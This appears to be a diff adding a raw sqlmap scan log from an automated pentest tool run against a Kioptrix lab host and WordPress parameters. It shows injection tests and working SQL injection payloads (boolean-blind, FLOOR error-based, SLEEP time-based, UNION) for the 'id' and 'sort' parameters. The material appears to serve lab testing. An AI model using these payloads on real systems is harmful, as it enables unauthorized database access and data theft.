+[[36m19:28:18[0m] [[32mINFO[0m] testing '[37mMySQL boolean-based blind - Parameter replace (bool*int)[0m'
+[[36m19:28:18[0m] [[32mINFO[0m] testing '[37mMySQL boolean-based blind - Parameter replace (bool*int - original value)[0m'
+[[36m19:28:18[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause[0m'
+[[36m19:28:18[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)[0m'
+[[36m19:28:19[0m] [[32mINFO[0m] testing '[37mMySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause[0m'
+[[36m19:28:19[0m] [[32mINFO[0m] testing '[37mMySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)[0m'
+[[36m19:28:19[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 boolean-based blind - Stacked queries[0m'
+[[36m19:28:20[0m] [[32mINFO[0m] testing '[37mMySQL < 5.0 boolean-based blind - Stacked queries[0m'
+[[36m19:28:20[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)[0m'
+[[36m19:28:26[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)[0m'
+[[36m19:28:32[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)[0m'
+[[36m19:28:39[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)[0m'
+[[36m19:28:46[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)[0m'
+[[36m19:28:51[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)[0m'
+[[36m19:28:58[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:29:04[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:29:12[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)[0m'
+[[36m19:29:18[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)[0m'
+[[36m19:29:25[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)[0m'
+[[36m19:29:31[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)[0m'
+[[36m19:29:37[0m] [[32mINFO[0m] testing '[37mMySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:29:44[0m] [[32mINFO[0m] testing '[37mMySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)[0m'
+[[36m19:29:50[0m] [[32mINFO[0m] testing '[37mMySQL OR error-based - WHERE or HAVING clause (FLOOR)[0m'
+[[36m19:29:53[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)[0m'
+[[36m19:29:58[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)[0m'
+[[36m19:29:58[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.5 error-based - Parameter replace (EXP)[0m'
+[[36m19:29:58[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)[0m'
+[[36m19:29:58[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:29:58[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 error-based - Parameter replace (UPDATEXML)[0m'
+[[36m19:29:59[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)[0m'
+[[36m19:29:59[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)[0m'
+[[36m19:29:59[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)[0m'
+[[36m19:29:59[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)[0m'
+[[36m19:30:00[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)[0m'
+[[36m19:30:00[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)[0m'
+[[36m19:30:00[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)[0m'
+[[36m19:30:00[0m] [[32mINFO[0m] testing '[37mMySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)[0m'
+[[36m19:30:01[0m] [[32mINFO[0m] testing '[37mMySQL inline queries[0m'
+[[36m19:30:01[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 stacked queries (comment)[0m'
+[[36m19:30:04[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 stacked queries[0m'
+[[36m19:30:08[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 stacked queries (query SLEEP - comment)[0m'
+[[36m19:30:11[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 stacked queries (query SLEEP)[0m'
+[[36m19:30:16[0m] [[32mINFO[0m] testing '[37mMySQL < 5.0.12 stacked queries (heavy query - comment)[0m'
+[[36m19:30:19[0m] [[32mINFO[0m] testing '[37mMySQL < 5.0.12 stacked queries (heavy query)[0m'
+[[36m19:30:23[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:30:39[0m][1m [[32;1mINFO[0m][1m GET parameter '[37msort[0m[1m' appears to be '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m[1m' injectable [0m
+[[36m19:30:39[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 20 columns[0m'
+[[36m19:30:41[0m] [[32mINFO[0m] testing '[37mMySQL UNION query (NULL) - 1 to 20 columns[0m'
+[[36m19:30:43[0m] [[32mINFO[0m] testing '[37mMySQL UNION query (random number) - 1 to 20 columns[0m'
+[[36m19:30:46[0m] [[32mINFO[0m] testing '[37mMySQL UNION query (NULL) - 21 to 40 columns[0m'
+[[36m19:30:48[0m] [[32mINFO[0m] testing '[37mMySQL UNION query (random number) - 21 to 40 columns[0m'
+[[36m19:30:51[0m] [[32mINFO[0m] testing '[37mMySQL UNION query (NULL) - 41 to 60 columns[0m'
+[[36m19:30:53[0m] [[32mINFO[0m] testing '[37mMySQL UNION query (random number) - 41 to 60 columns[0m'
+[[36m19:30:56[0m] [[32mINFO[0m] testing '[37mMySQL UNION query (NULL) - 61 to 80 columns[0m'
+[[36m19:30:59[0m] [[32mINFO[0m] testing '[37mMySQL UNION query (random number) - 61 to 80 columns[0m'
+[[36m19:31:01[0m] [[32mINFO[0m] testing '[37mMySQL UNION query (NULL) - 81 to 100 columns[0m'
+[[36m19:31:03[0m] [[32mINFO[0m] testing '[37mMySQL UNION query (random number) - 81 to 100 columns[0m'
+[[36m19:31:06[0m] [[32mINFO[0m] checking if the injection point on GET parameter '[37msort[0m' is a false positive
+[1mGET parameter 'sort' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
+[0msqlmap identified the following injection point(s) with a total of 2375 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (7288=7288) THEN 1 ELSE (SELECT 7092 UNION SELECT 3884) END))&sort=avain
+
+    Type: error-based
+    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: id=1 OR ROW(7403,6189)>(SELECT COUNT(*),CONCAT(0x7162626a71,(SELECT (ELT(7403=7403,1))),0x716a6a7171,FLOOR(RAND(0)*2))x FROM (SELECT 1785 UNION SELECT 4081 UNION SELECT 6864 UNION SELECT 7157)a GROUP BY x)&sort=avain
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 8887 FROM (SELECT(SLEEP(5)))eGXn)&sort=avain
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7162626a71,0x65566b706a684258516f47494d6b56797569676b4b4470776775595667447a526546516d43664172,0x716a6a7171),NULL,NULL,NULL,NULL-- -&sort=avain
+
+Parameter: sort (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1&sort=avain AND (SELECT 6008 FROM (SELECT(SLEEP(5)))YRZE)
+---
+[1mthere were multiple injection points, please select the one to use for following injections:
+[0] place: GET, parameter: id, type: Unescaped numeric (default)
+[1] place: GET, parameter: sort, type: Unescaped numeric
+[q] Quit
+> 0
+[0m[[36m19:31:26[0m][1m [[32;1mINFO[0m][1m the back-end DBMS is MySQL[0m
+[[36m19:31:27[0m] [[33mWARNING[0m] in case of continuous data retrieval problems you are advised to try a switch '[37m--no-cast[0m' or switch '[37m--hex[0m'
+back-end DBMS: MySQL >= 5.0.12
+[[36m19:31:27[0m] [[33mWARNING[0m] HTTP error codes detected during run:
+500 (Internal Server Error) - 2351 times
+[[36m19:31:27[0m] [[32mINFO[0m] fetched data logged to text files under '[37m/avain/modules/web/sqlmap/sqlmap_out_dir/kioptrix3.com[0m'
+
+[*] ending @ 19:31:27 /2020-04-13/
+
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m'[01;49m]_____ ___ ___  [01;37m{[01;34m1.4.3#pip[01;37m}[01;33m
+|_ -| . [[01;41m"[01;49m]     | .'| . |
+|___|_  [[01;41m([01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:31:28 /2020-04-13/
+
+[?1049h[1;24r(B[m[4l[?7h[24;1H[?1049l[?1l>[[36m19:31:28[0m] [[33mWARNING[0m] using '[37m/avain/modules/web/sqlmap/sqlmap_out_dir[0m' as the output directory
+[[36m19:31:28[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[[36m19:31:30[0m] [[32mINFO[0m] checking if the target is protected by some kind of WAF/IPS
+[[36m19:31:31[0m][1m [[32;1mINFO[0m][1m testing NULL connection to the target URL[0m
+[[36m19:31:32[0m] [[32mINFO[0m] testing if the target URL content is stable
+[[36m19:31:33[0m] [[33mWARNING[0m] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph '[37mPage comparison[0m'
+[1mhow do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[0m[[36m19:31:34[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37ms[0m[1m' might not be injectable[0m
+[[36m19:31:35[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37ms[0m'
+[[36m19:31:36[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:31:37[0m] [[33mWARNING[0m] reflective value(s) found and filtering out
+[[36m19:31:41[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:31:42[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:31:43[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:31:43[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:31:44[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:31:45[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:31:45[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:31:46[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:31:46[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:31:46[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:31:47[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:31:47[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:31:48[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:31:48[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[1mit is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[0m[[36m19:31:49[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:31:51[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37ms[0m[1m' does not seem to be injectable[0m
+[[36m19:31:51[0m] [[41;37mCRITICAL[0m] all tested parameters do not appear to be injectable. Try to increase values for '[37m--level[0m'/'[37m--risk[0m' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '[37m--tamper[0m' (e.g. '[37m--tamper=space2comment[0m') and/or switch '[37m--random-agent[0m'
+
+[*] ending @ 19:31:51 /2020-04-13/
+
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m.[01;49m]_____ ___ ___  [01;37m{[01;34m1.4.3#pip[01;37m}[01;33m
+|_ -| . [[01;41m"[01;49m]     | .'| . |
+|___|_  [[01;41m)[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:31:52 /2020-04-13/
+
+[?1049h[1;24r(B[m[4l[?7h[24;1H[?1049l[?1l>[[36m19:31:52[0m] [[33mWARNING[0m] using '[37m/avain/modules/web/sqlmap/sqlmap_out_dir[0m' as the output directory
+[[36m19:31:52[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[[36m19:31:52[0m] [[32mINFO[0m] checking if the target is protected by some kind of WAF/IPS
+[[36m19:31:52[0m][1m [[32;1mINFO[0m][1m testing NULL connection to the target URL[0m
+[[36m19:31:52[0m][1m [[32;1mINFO[0m][1m NULL connection is supported with GET method ('[37mRange[0m[1m')[0m
+[[36m19:31:52[0m] [[32mINFO[0m] testing if the target URL content is stable
+[[36m19:31:53[0m] [[32mINFO[0m] target URL content is stable
+[[36m19:31:53[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mrsd[0m[1m' might not be injectable[0m
+[[36m19:31:53[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mrsd[0m'
+[[36m19:31:53[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:31:53[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:31:53[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:31:54[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:31:54[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:31:54[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:31:54[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:31:54[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:31:54[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+                                                                               [[36m19:31:54[0m] [[33mWARNING[0m] time-based comparison requires larger statistical model, please wait...... (done)
+[[36m19:31:54[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:31:54[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:31:54[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:31:55[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:31:55[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:31:55[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[1mit is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[0m[[36m19:31:55[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:31:55[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mrsd[0m[1m' does not seem to be injectable[0m
+[[36m19:31:55[0m] [[41;37mCRITICAL[0m] all tested parameters do not appear to be injectable. Try to increase values for '[37m--level[0m'/'[37m--risk[0m' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '[37m--tamper[0m' (e.g. '[37m--tamper=space2comment[0m') and/or switch '[37m--random-agent[0m'
+
+[*] ending @ 19:31:55 /2020-04-13/
+
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m.[01;49m]_____ ___ ___  [01;37m{[01;34m1.4.3#pip[01;37m}[01;33m
+|_ -| . [[01;41m)[01;49m]     | .'| . |
+|___|_  [[01;41m)[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:31:57 /2020-04-13/
+
+[?1049h[1;24r(B[m[4l[?7h[24;1H[?1049l[?1l>[[36m19:31:57[0m] [[33mWARNING[0m] using '[37m/avain/modules/web/sqlmap/sqlmap_out_dir[0m' as the output directory
+[[36m19:31:57[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[1myou have not declared cookie(s), while server wants to set its own ('wordpress_test_cookie=WP+Cookie+check'). Do you want to use those [Y/n] Y
+[0m[[36m19:31:57[0m] [[32mINFO[0m] checking if the target is protected by some kind of WAF/IPS
+[[36m19:31:57[0m][1m [[32;1mINFO[0m][1m testing NULL connection to the target URL[0m
+[[36m19:31:57[0m][1m [[32;1mINFO[0m][1m NULL connection is supported with GET method ('[37mRange[0m[1m')[0m
+[[36m19:31:57[0m] [[32mINFO[0m] testing if the target URL content is stable
+[[36m19:31:57[0m] [[32mINFO[0m] target URL content is stable
+[[36m19:31:57[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mredirect_to[0m[1m' might not be injectable[0m
+[[36m19:31:58[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mredirect_to[0m'
+[[36m19:31:58[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:31:58[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:31:58[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:31:58[0m] [[33mWARNING[0m] reflective value(s) found and filtering out
+[[36m19:31:58[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:31:59[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:31:59[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:31:59[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:31:59[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:31:59[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+                                                                               [[36m19:31:59[0m] [[33mWARNING[0m] time-based comparison requires larger statistical model, please wait...... (done)
+[[36m19:31:59[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:32:00[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:32:00[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:32:00[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:32:00[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:32:00[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[1mit is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[0m[[36m19:32:00[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:32:01[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mredirect_to[0m[1m' does not seem to be injectable[0m
+[[36m19:32:01[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mreauth[0m[1m' might not be injectable[0m
+[[36m19:32:01[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mreauth[0m'
+[[36m19:32:01[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:32:01[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:32:02[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:32:02[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:32:02[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:32:02[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:32:02[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:32:02[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:32:02[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:32:02[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:32:02[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:32:03[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:32:03[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:32:03[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:32:03[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[[36m19:32:03[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:32:03[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mreauth[0m[1m' does not seem to be injectable[0m
+[[36m19:32:03[0m] [[41;37mCRITICAL[0m] all tested parameters do not appear to be injectable. Try to increase values for '[37m--level[0m'/'[37m--risk[0m' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '[37m--tamper[0m' (e.g. '[37m--tamper=space2comment[0m') and/or switch '[37m--random-agent[0m'
+
+[*] ending @ 19:32:03 /2020-04-13/
+
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m([01;49m]_____ ___ ___  [01;37m{[01;34m1.4.3#pip[01;37m}[01;33m
+|_ -| . [[01;41m"[01;49m]     | .'| . |
+|___|_  [[01;41m([01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:32:05 /2020-04-13/
+
+[?1049h[1;24r(B[m[4l[?7h[24;1H[?1049l[?1l>[[36m19:32:05[0m] [[33mWARNING[0m] using '[37m/avain/modules/web/sqlmap/sqlmap_out_dir[0m' as the output directory
+[[36m19:32:05[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[1myou have not declared cookie(s), while server wants to set its own ('wordpress_test_cookie=WP+Cookie+check'). Do you want to use those [Y/n] Y
+[0m[[36m19:32:05[0m] [[32mINFO[0m] testing if the target URL content is stable
+[[36m19:32:06[0m] [[33mWARNING[0m] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph '[37mPage comparison[0m'
+[1mhow do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[0m[[36m19:32:06[0m] [[32mINFO[0m] searching for dynamic content
+[[36m19:32:06[0m] [[32mINFO[0m] dynamic content marked for removal (3 regions)
+[[36m19:32:06[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that POST parameter '[37mlog[0m[1m' might not be injectable[0m
+[[36m19:32:06[0m] [[32mINFO[0m] testing for SQL injection on POST parameter '[37mlog[0m'
+[[36m19:32:06[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:32:07[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:32:07[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:32:07[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:32:07[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:32:07[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:32:07[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:32:07[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:32:07[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:32:07[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:32:08[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:32:08[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:32:08[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:32:08[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:32:08[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[1mit is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[0m[[36m19:32:08[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:32:09[0m][1m [[33;1mWARNING[0m][1m POST parameter '[37mlog[0m[1m' does not seem to be injectable[0m
